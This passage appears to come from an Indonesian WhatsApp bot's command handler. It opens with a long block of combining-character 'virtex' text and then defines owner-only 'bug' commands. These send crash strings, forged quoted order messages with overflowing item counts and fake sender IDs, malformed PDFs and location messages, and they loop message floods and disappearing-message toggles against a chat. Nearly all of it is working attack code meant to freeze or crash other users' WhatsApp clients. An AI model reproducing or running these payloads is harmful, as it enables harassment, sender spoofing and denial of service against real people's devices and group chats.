̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̏͟͟⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',                      
                          jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 99999999, // Bug
    status: 1,
    surface: 1,
    message: 'ʀᴀɴᴢ',
    orderTitle: 'fuck', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
await zoe.toggleDisappearingMessages(from,`MODAR`,text)	    
		       break
		       //ini Gua enc karena masih privat punya hw mods
        case 'bugbrutal':
if (!dev.key.fromMe && !isOwner) return
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.sendMessage(from, 'ɢᴇᴍ⸙', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: 'ʀᴀɴᴢ',
    orderTitle: 'zoe', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugv2':
if (!dev.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
}
reply('Sukses Send Bug Sebanyak '+args.join(' '))
					break
        case 'bugstik':
        if (!dev.key.fromMe && !isOwner) return
        zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                 const ara = fs.readFileSync('./lib/bug.webp');
                  zoe.sendMessage(from, ara, MessageType.sticker, {quoted: {key: {participant: '0@s.whatsapp.net' },message: {orderMessage: {itemCount: 999999999,status: 1,surface: 1,message: 'ꪶ𖣂ꫂzoe',orderTitle: 'FAKE-BOT',sellerJid: '0@s.whatsapp.net'}}}})                  
        break
        case 'bugtext':
if (!dev.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${NamaBot}`
		        var grousp = await zoe.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: dev
                }
		        for (let i = 0; i < args[0]; i++) {
		        zoe.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62895606059646@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${namaowner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        zoe.sendMessage(from, `${namabot}`, MessageType.extendedText, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62895606059646@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${namabot}`,
						"orderTitle": `${namaowner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'jadicv5':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await zoe.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "thumbnail": virgam,
             "title": `${q}                                 ${spamvirtex}`,
             "description": `${desk}`,
             "retailerId": "zoe",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: dev, contextInfo:{}})
   zoe.relayWAMessage(res)
}
break
case 'jadicv4':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await zoe.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "thumbnail": virgam,
             "title": `${q} ${jadivirtex1}`,
             "description": `${jadivirtex1} ${virtexctlgg} `,
             "retailerId": "zoe",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: dev, contextInfo:{}})
   zoe.relayWAMessage(res)
}
break
		       case 'allbuglokasi':
       if (!dev.key.fromMe && !isOwner) return
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe',
						address: `${virtex8(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe',
    orderTitle: 'b', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe',
						address: `${virtex9(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe',
    orderTitle: 'b', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe ',
						address: `${virtex2(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe̷',
    orderTitle: 'c', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe',
						address: `${virtex7(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe̷',
    orderTitle: 'd', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe ',
						address: `${virtex5(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe',
    orderTitle: 'e', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: 'zoe',
						address: `${virtex4(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe̷',
    orderTitle: 'f', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥ʀᴀɴᴢ々ɢᴇᴍ',
						address: `${virtex3(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe̷',
    orderTitle: 'g', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥ʀᴀɴᴢ々ɢᴇᴍ',
						address: `${virtex(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ̷',
    orderTitle: 'h', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./lib/bug.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: 'ʀᴀɴᴢ',
						address: `${ngazap(prefix)}`,
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'zoe',
    orderTitle: 'Z', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
 case 'bugtroli':
		    if (!dev.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
zoe.sendMessage(from,`▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\x0a▒▒█▒▒▒▄██████████▄▒▒▒▒\x0a▒█▐▒▒▒████████████▒▒▒▒\x0a▒▌▐▒▒██▄▀██████▀▄██▒▒▒\x0a▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\x0a▐┼▐▒▒██████████████▒▒▒\x0a▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\x0a▒▒█████──────────▐███▌\x0a▒▒█▀▀██▄█─▄───▐─▄███▀▒\x0a▒▒█▒▒███████▄██████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒█████████▐▌██▌▒▒▒\x0a▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: -969769349,
status: 1,
surface: 10,
message: '🔥ʀᴀɴᴢ々ɢᴇᴍ̷',
orderTitle: `🔥ʙᴏᴛᴢ🔥`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
await zoe.toggleDisappearingMessages(from)
await zoe.toggleDisappearingMessages(from)
break
case 'troliv2':
if (!dev.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
				 zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
				 zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
 hmm4 = fs.readFileSync(`./lib/logo.jpg`)
imeu = await zoe.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
                      res = await zoe.prepareMessageFromContent(from, {
                           "orderMessage": {
                               "orderId": "3184312811796096",
                               "sellerJid": "6285714170944@s.whatsapp.net",
                               "itemCount": 2021,
                               "status": "INQUIRY",
                               "thumbnail": fs.readFileSync('./lib/logo.jpg'),
                               "surface": "CATALOG",
                               "jpegThumbnail": fs.readFileSync('./lib/logo.jpg'),
                               "message": `${virtex2(prefix)}`,
                               "orderTitle": "9999999999999",
                                "token": "AR72qWd0CaoPN/e5maiyQRxx+gykcW/JH8LXwoJVcQsVgg==",
                                "totalAmount1000": "999999999999999999999999999",
                               "totalCurrencyCode": "IDR",
                                }
                       }, {quoted:{key : {participant: '0@s.whatsapp.net' },message: {orderMessage: {itemCount: 999999999,status: 1,surface: 1,message: 'ʀᴀɴᴢ々ɢᴇᴍ',orderTitle: 'ʀᴀɴᴢ',sellerJid: '0@s.whatsapp.net'}}}})
                        zoe.relayWAMessage(res)
                        zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                        zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                        } 
                        break
                                      case 'bugpdf':
if (!dev.key.fromMe && !isOwner) return
hm = fs.readFileSync('./src/Z.pdf')
zoe.sendMessage(from, hm, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️️',
    orderTitle: 'bugpdf〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }, pageCount: 9999999,filename:`${ngazap(prefix)}.pdf`, mimetype: 'application/pdf',jpegThumbnail: image}) 
 break
case 'bugsungsw':
